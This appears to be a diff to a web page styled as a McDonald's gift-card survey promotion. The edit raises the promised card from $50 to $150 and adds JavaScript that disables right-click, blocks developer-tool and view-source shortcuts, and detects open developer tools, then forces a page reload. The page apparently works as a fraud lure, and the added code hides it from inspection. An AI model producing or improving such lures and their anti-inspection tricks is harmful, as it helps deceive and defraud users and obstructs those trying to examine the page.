@@ -3,8 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim Your McDonald's Gift Card | Official Promotion</title>
-    <meta name="description" content="Claim your exclusive $50 McDonald's gift card by participating in our quick survey. Limited time offer!">
+    <title>Claim Your McDonald's Gift Card</title>
+    <meta name="description" content="Claim your exclusive $150 McDonald's gift card by participating in our quick survey. Limited time offer!">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
@@ -778,6 +778,40 @@
                 }
             });
         });
+// Disable Right-Click
+document.addEventListener("contextmenu", (event) => event.preventDefault());
+
+// Disable Certain Keys (F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U, etc.)
+document.addEventListener("keydown", (event) => {
+    if (
+        event.key === "F12" || 
+        (event.ctrlKey && event.shiftKey && event.key === "I") || 
+        (event.ctrlKey && event.shiftKey && event.key === "J") || 
+        (event.ctrlKey && event.key === "U")
+    ) {
+        event.preventDefault();
+    }
+});
+
+// Detect and Block Developer Tools
+(function() {
+    function detectDevTools() {
+        const devtools = /./;
+        devtools.toString = function() {
+            this.opened = true;
+        };
+        console.log("%c", devtools);
+        return devtools.opened;
+    }
+
+    setInterval(() => {
+        if (detectDevTools()) {
+            alert("Developer Tools detected! Please close DevTools.");
+            window.location.reload();
+        }
+    }, 1000);
+})();
+
     </script>
 </body>
 </html>
